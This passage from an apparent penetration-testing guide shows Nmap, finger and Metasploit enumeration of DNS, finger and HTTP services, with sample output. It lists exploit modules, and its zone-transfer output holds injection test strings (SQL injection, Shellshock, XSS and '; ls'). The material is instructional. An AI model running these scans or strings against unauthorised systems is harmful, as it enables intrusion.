</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-recursion.html">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 53 --script=dns-recursion 202.191.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:39 IST
</span><span class='line'>Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
</span><span class='line'>Host is up (0.094s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/udp open  domain
</span><span class='line'>|_dns-recursion: Recursion appears to be enabled
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html">dns-service-discovery.nse</a> : Attempts to discover target hosts' services using the DNS Service Discovery protocol. The script first sends a query for _services._dns-sd._udp.local to get a list of services. It then sends a followup query for each one to try to get more information.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run
</span><span class='line'>nmap --script=dns-service-discovery -p 5353 &lt;target&gt;</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:
<ul>
<li>Active Directory Global Catalog</li>
<li>Exchange Autodiscovery</li>
<li>Kerberos KDC Service</li>
<li>Kerberos Passwd Change Service</li>
<li>LDAP Servers</li>
<li>SIP Servers</li>
<li>XMPP S2S</li>
<li>XMPP C2S</li>
</ul>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me nsztm2.digi.ninja
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:49 IST
</span><span class='line'>Nmap scan report for nsztm2.digi.ninja (167.88.xx.xx)
</span><span class='line'>Host is up (0.29s latency).
</span><span class='line'>Other addresses for nsztm2.digi.ninja (not scanned): 64:ff9b::a758:2a5e
</span><span class='line'>rDNS record for 167.88.xx.xx: zonetransfer.me
</span><span class='line'>Not shown: 996 closed ports
</span><span class='line'>PORT     STATE    SERVICE
</span><span class='line'>53/tcp   open     domain
</span><span class='line'>| dns-zone-transfer: 
</span><span class='line'>| zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
</span><span class='line'>| zonetransfer.me.                                HINFO  "Casio fx-700G" "Windows XP"
</span><span class='line'>| zonetransfer.me.                                TXT    "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
</span><span class='line'>| zonetransfer.me.                                MX     0 ASPMX.L.GOOGLE.COM.
</span><span class='line'>| zonetransfer.me.                                MX     10 ALT1.ASPMX.L.GOOGLE.COM.
</span><span class='line'>| zonetransfer.me.                                MX     10 ALT2.ASPMX.L.GOOGLE.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX2.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX3.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX4.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                MX     20 ASPMX5.GOOGLEMAIL.COM.
</span><span class='line'>| zonetransfer.me.                                A      217.147.xx.xx
</span><span class='line'>| zonetransfer.me.                                NS     nsztm1.digi.ninja.
</span><span class='line'>| zonetransfer.me.                                NS     nsztm2.digi.ninja.
</span><span class='line'>| _sip._tcp.zonetransfer.me.                      SRV    0 0 5060 www.zonetransfer.me.
</span><span class='line'>| 157.177.xx.xx.IN-ADDR.ARPA.zonetransfer.me.   PTR    www.zonetransfer.me.
</span><span class='line'>| asfdbauthdns.zonetransfer.me.                   AFSDB  1 asfdbbox.zonetransfer.me.
</span><span class='line'>| asfdbbox.zonetransfer.me.                       A      127.0.xx.xx
</span><span class='line'>| asfdbvolume.zonetransfer.me.                    AFSDB  1 asfdbbox.zonetransfer.me.
</span><span class='line'>| canberra-office.zonetransfer.me.                A      202.14.xx.xx
</span><span class='line'>| cmdexec.zonetransfer.me.                        TXT    "; ls"
</span><span class='line'>| contact.zonetransfer.me.                        TXT    "Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
</span><span class='line'>| dc-office.zonetransfer.me.                      A      143.228.xx.xx
</span><span class='line'>| deadbeef.zonetransfer.me.                       AAAA   dead:beaf::
</span><span class='line'>| dr.zonetransfer.me.                             LOC    53.349044 N 1.642646 W 0m 1.0m 10000.0m 10.0m
</span><span class='line'>| DZC.zonetransfer.me.                            TXT    "AbCdEfG"
</span><span class='line'>| email.zonetransfer.me.                          NAPTR  1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
</span><span class='line'>| email.zonetransfer.me.                          A      74.125.xx.xx
</span><span class='line'>| Info.zonetransfer.me.                           TXT    "ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
</span><span class='line'>| internal.zonetransfer.me.                       NS     intns1.zonetransfer.me.
</span><span class='line'>| internal.zonetransfer.me.                       NS     intns2.zonetransfer.me.
</span><span class='line'>| intns1.zonetransfer.me.                         A      167.88.xx.xx
</span><span class='line'>| intns2.zonetransfer.me.                         A      167.88.xx.xx
</span><span class='line'>| office.zonetransfer.me.                         A      4.23.xx.xx
</span><span class='line'>| ipv6actnow.org.zonetransfer.me.                 AAAA   2001:67c:2e8:11::c100:1332
</span><span class='line'>| owa.zonetransfer.me.                            A      207.46.xx.xx
</span><span class='line'>| robinwood.zonetransfer.me.                      TXT    "Robin Wood"
</span><span class='line'>| rp.zonetransfer.me.                             RP     robin.zonetransfer.me. robinwood.zonetransfer.me.
</span><span class='line'>| sip.zonetransfer.me.                            NAPTR  2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
</span><span class='line'>| sqli.zonetransfer.me.                           TXT    "' or 1=1 --"
</span><span class='line'>| sshock.zonetransfer.me.                         TXT    "() { :]}; echo ShellShocked"
</span><span class='line'>| staging.zonetransfer.me.                        CNAME  www.sydneyoperahouse.com.
</span><span class='line'>| alltcpportsopen.firewall.test.zonetransfer.me.  A      127.0.xx.xx
</span><span class='line'>| testing.zonetransfer.me.                        CNAME  www.zonetransfer.me.
</span><span class='line'>| vpn.zonetransfer.me.                            A      174.36.xx.xx
</span><span class='line'>| www.zonetransfer.me.                            A      217.147.xx.xx
</span><span class='line'>| xss.zonetransfer.me.                            TXT    "'&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;"
</span><span class='line'>|_zonetransfer.me.                                SOA    nsztm1.digi.ninja. robin.digi.ninja.
</span><span class='line'>135/tcp  filtered msrpc
</span><span class='line'>445/tcp  filtered microsoft-ds
</span><span class='line'>8333/tcp filtered bitcoin
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>Finger | Port 79</h3>

<ol>
<strong>Metasploit</strong> has a 
<li><strong>Finger Service User Enumerator</strong> which can be used to identify users.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/finger/finger_users
</span><span class='line'>services -p 79 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 172.30.xx.xx:79 - Found user: adm
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: lp
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: uucp
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: nuucp
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: listen
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: bin
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: daemon
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: gdm
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: noaccess
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: nobody
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: nobody4
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: oracle
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: postgres
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: root
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: svctag
</span><span class='line'>[+] 172.30.xx.xx:79 - Found user: sys
</span><span class='line'>[+] 172.30.xx.xx:79 Users found: adm, bin, daemon, gdm, listen, lp, noaccess, nobody, nobody4, nuucp, oracle, postgres, root, svctag, sys, uucp</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/finger.html">finger.nse</a>  : Attempts to retrieve a list of usernames using the finger service.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>Same can be done using</p>

<ul>
<li>finger command
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger root 172.30.xx.xx
</span><span class='line'>finger: 172.30.xx.xx: no such user.
</span><span class='line'>Login: root                       Name: root
</span><span class='line'>Directory: /root                      Shell: /bin/bash
</span><span class='line'>Last login Sat Feb  6 22:43 (IST) on tty1
</span><span class='line'>No mail.
</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>


<h3>HTTP</h3>

<p>Let&rsquo;s first get a hold of what services are running on the network by checking the different banners</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -p 80 -c port,name,info -u -o /tmp/http.ports
</span><span class='line'>cat /tmp/http.ports | cut -d , -f2,3,4 | sort | uniq | tr -d \" | grep -v port | sort -n</span></code></pre></td></tr></table></div></figure>


<p>Sample Services running</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>80,http,3Com switch http config
</span><span class='line'>80,http,3Com switch webadmin 1.0
</span><span class='line'>80,http,Agranat-EmWeb 5.2.6 HP LaserJet http config
</span><span class='line'>80,http,Allegro RomPager 4.01
</span><span class='line'>80,http,Allegro RomPager 4.30
</span><span class='line'>80,http,Allen-Bradley 1761-NET-ENIW http config
</span><span class='line'>80,http,Apache-Coyote/1.1
</span><span class='line'>80,http,Apache-Coyote/1.1 ( 401-Basic realm=Tomcat Manager Application )
</span><span class='line'>80,http,Apache httpd
</span><span class='line'>80,http,Apache httpd 0.6.5
</span><span class='line'>80,http,Apache httpd 1.3.27 (Unix) (Red-Hat/Linux) PHP/4.1.2 mod_perl/1.24_01
</span><span class='line'>80,http,Apache httpd 2.0.63 (CentOS)
</span><span class='line'>80,http,Apache httpd 2.2.10 (Fedora)
</span><span class='line'>80,http,Apache httpd 2.2.15 (Red Hat)
</span><span class='line'>80,http,Apache httpd 2.2.17 (Win32)
</span><span class='line'>80,http,Apache httpd 2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1
</span><span class='line'>80,http,Apache httpd 2.2.22 (Ubuntu)
</span><span class='line'>80,http,Apache httpd 2.2.22 (Unix)
</span><span class='line'>80,http,Apache httpd 2.2.3 (CentOS)
</span><span class='line'>80,http,Apache httpd 2.2.3 (Red Hat)
</span><span class='line'>80,http,Apache httpd 2.4.12 (Unix)
</span><span class='line'>80,http,Apache httpd 2.4.7 (Ubuntu)
</span><span class='line'>80,http,Apache httpd 2.4.9 (Win32) PHP/5.5.12
</span><span class='line'>80,http,Apache httpd 2.4.9 (Win64)
</span><span class='line'>80,http,Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>80,http,AudioCodes MP-202 VoIP adapter http config
</span><span class='line'>80,http,BenQ projector Crestron RoomView
</span><span class='line'>80,http,Boa HTTPd 0.94.14rc19
</span><span class='line'>80,http,BusyBox httpd 1.13
</span><span class='line'>80,http,Canon Pixma IP4000R printer http config KS_HTTP 1.0
</span><span class='line'>80,http,Canon printer web interface
</span><span class='line'>80,http,Check Point NGX Firewall-1
</span><span class='line'>80,http,ChipPC Extreme httpd
</span><span class='line'>80,http,Cisco IOS http config
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 5.6.100
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 6.0.0
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 6.0.2
</span><span class='line'>80,http,Citrix Xen Simple HTTP Server XenServer 6.2.0
</span><span class='line'>80,http,Crestron MPS-200 AV routing system http config
</span><span class='line'>80,http,Crestron PRO2 automation system web server
</span><span class='line'>80,http,Debut embedded httpd 1.20 Brother/HP printer http admin
</span><span class='line'>80,http,Dell N2000-series switch http admin
</span><span class='line'>80,http,Dell PowerVault TL4000 http config
</span><span class='line'>80,http,D-Link print server http config 1.0
</span><span class='line'>80,http,Embedthis HTTP lib httpd
</span><span class='line'>80,http,Gembird/Hawking/Netgear print server http config
</span><span class='line'>80,http,GoAhead WebServer
</span><span class='line'>80,http,GoAhead WebServer LinkSys SLM2024 or SRW2008 - SRW2016 switch http config
</span><span class='line'>80,http,GoAhead WebServer Router with realtek 8181 chipset http config
</span><span class='line'>80,http,HP-ChaiSOE 1.0 HP LaserJet http config
</span><span class='line'>80,http,HP Deskjet 3050 J610 printer http config Serial CN12E3937Y05HX
</span><span class='line'>80,http,HP Deskjet 3520 printer http config Serial CN3471G0QJ05T0
</span><span class='line'>80,http,HP Deskjet 3540 printer http config Serial CN41K2T0RN05X6
</span><span class='line'>80,http,HP Integrated Lights-Out web interface 1.30
</span><span class='line'>80,http,HP LaserJet 1022n printer http config 4.0.xx.xx
</span><span class='line'>80,http,HP LaserJet CP1205nw or P1606 http config
</span><span class='line'>80,http,HP LaserJet P2014n printer http config 4.2
</span><span class='line'>80,http,HP Officejet 7610 printer http config Serial CN5293M07X064N
</span><span class='line'>80,http,HP Officejet Pro X576dw printer http config Serial CN4BDJX0RC
</span><span class='line'>80,http,HP ProCurve 1800-24G switch http config
</span><span class='line'>80,http,HP ProCurve httpd
</span><span class='line'>80,http,Jetty 6.1.x
</span><span class='line'>80,http,Konica Minolta PageScope Web Connection httpd
</span><span class='line'>80,http,Liaison Exchange Commerce Suite
</span><span class='line'>80,http,lighttpd
</span><span class='line'>80,http,lighttpd 1.4.23
</span><span class='line'>80,http,lighttpd 1.4.28
</span><span class='line'>80,http,lighttpd 1.4.29
</span><span class='line'>80,http,lighttpd 1.4.32
</span><span class='line'>80,http,lighttpd 1.4.33
</span><span class='line'>80,http,Linksys PAP2 VoIP http config
</span><span class='line'>80,http,Lotus Domino httpd
</span><span class='line'>80,http,Mathopd httpd 1.5p6
</span><span class='line'>80,http,Mbedthis-Appweb 2.4.0
</span><span class='line'>80,http,Mbedthis-Appweb 2.4.2
</span><span class='line'>80,http,Mbedthis-Appweb 2.5.0
</span><span class='line'>80,http,Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
</span><span class='line'>80,http,Microsoft-IIS/10.0
</span><span class='line'>80,http,Microsoft-IIS/10.0 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/5.1
</span><span class='line'>80,http,Microsoft-IIS/5.1 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/6.0
</span><span class='line'>80,http,Microsoft-IIS/6.0 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/7.5
</span><span class='line'>80,http,Microsoft-IIS/7.5 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/8.0 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft-IIS/8.5
</span><span class='line'>80,http,Microsoft-IIS/8.5 ( Powered by ASP.NET )
</span><span class='line'>80,http,Microsoft IIS httpd 10.0
</span><span class='line'>80,http,Microsoft IIS httpd 5.1
</span><span class='line'>80,http,Microsoft IIS httpd 6.0
</span><span class='line'>80,http,Microsoft IIS httpd 7.5
</span><span class='line'>80,http,Microsoft IIS httpd 8.0
</span><span class='line'>80,http,Microsoft IIS httpd 8.5
</span><span class='line'>80,http,MoxaHttp 1.0
</span><span class='line'>80,http,nginx 1.2.2
</span><span class='line'>80,http,Omron PLC http config
</span><span class='line'>80,http,Oracle HTTP Server Powered by Apache 1.3.22 mod_plsql/3.0.xx.xx.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25
</span><span class='line'>80,http,Panasonic WV-NF284 webcam http config
</span><span class='line'>80,http,Panasonic WV-NP304 webcam http config
</span><span class='line'>80,http,Panasonic WV-NW960 webcam http config
</span><span class='line'>80,http-proxy,Squid http proxy 2.5.STABLE4
</span><span class='line'>80,http,RapidLogic httpd 1.1
</span><span class='line'>80,http,Samsung SyncThru Web Service M337x 387x 407x series; SN: ZDFABJEF600007W
</span><span class='line'>80,http,uc-httpd 1.0.0
</span><span class='line'>80,http,Virata-EmWeb 6.0.1 HP JetDirect http config
</span><span class='line'>80,http,Virata-EmWeb 6.0.1 HP LaserJet 3055 printer http config
</span><span class='line'>80,http,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config
</span><span class='line'>80,http,Virata-EmWeb 6.2.1
</span><span class='line'>80,http,Virata-EmWeb 6.2.1 HP LaserJet http config
</span><span class='line'>80,http,Virata-EmWeb 6.2.1 HP LaserJet M1522nf MFP printer http config
</span><span class='line'>80,http,Virata-EmWeb 6.2.1 HP printer http config
</span><span class='line'>80,http,VMware ESXi 4.1 Server httpd
</span><span class='line'>80,http,VMware ESXi Server httpd
</span><span class='line'>80,http,Web-Server httpd 3.0 Ricoh Aficio printer web image monitor
</span><span class='line'>80,http,Western Digital My Book http config
</span><span class='line'>80,http,Zero One Technology 11 httpd 5.4.2049
</span><span class='line'>80,http,Zero One Technology 15 httpd 6.8.0104
</span><span class='line'>80,http,Zero One Technology 30 httpd 8.3.0013
</span><span class='line'>80,http,Zero One Technology 35 httpd 6.2.0001
</span><span class='line'>80,ipp,Canon printer http config 1.00
</span><span class='line'>80,ipp,Canon printer http config 2.10
</span><span class='line'>80,ipp,Canon printer http config 2.21
</span><span class='line'>80,ipp,HP Officejet Pro 8600 ipp model CM750A; serial CN314B3J9905SN
</span><span class='line'>80,ipp,Web-Server httpd 3.0 NRG copier or Ricoh Aficio printer http config
</span><span class='line'>80,rtsp,
</span><span class='line'>80,soap,gSOAP soap 2.7
</span><span class='line'>80,tcpwrapped,
</span><span class='line'>80,tcpwrapped,Cisco IOS http config
</span><span class='line'>80,tcpwrapped,Virata-EmWeb 6.0.1 HP LaserJet P2015 Series printer http config
</span><span class='line'>80,upnp,Epson Stylus NX230 printer UPnP UPnP 1.0; Epson UPnP SDK 1.0
</span><span class='line'>80,wsman,Openwsman</span></code></pre></td></tr></table></div></figure>


<p>So, A lot of stuff, Let&rsquo;s test them for one by one.</p>

<ol>
<li><strong>Webmin</strong>
Searching for webmin in Metasploit gave three modules
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
</span><span class='line'>   auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure
</span><span class='line'>   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution</span></code></pre></td></tr></table></div></figure>
but our webmin versions are different.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/admin/webmin/edit_html_fileaccess requires Webmin 1.580 plus it requires authenticated user.
</span><span class='line'>auxiliary/admin/webmin/file_disclosure Webmin (versions prior to 1.290) and Usermin (versions prior to 1.220)
</span><span class='line'>exploit/unix/webapp/webmin_show_cgi_exec in Webmin 1.580</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Moving on to <strong>Apache Tomcat</strong>

Searching for Tomcat
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -S "Tomcat"
</span><span class='line'>
</span><span class='line'>Services
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>host          port  proto  name      state  info
</span><span class='line'>----          ----  -----  ----      -----  ----
</span><span class='line'>10.10.xx.xx   8443  tcp    ssl/http  open   Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>10.10.xx.xx   80    tcp    http      open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
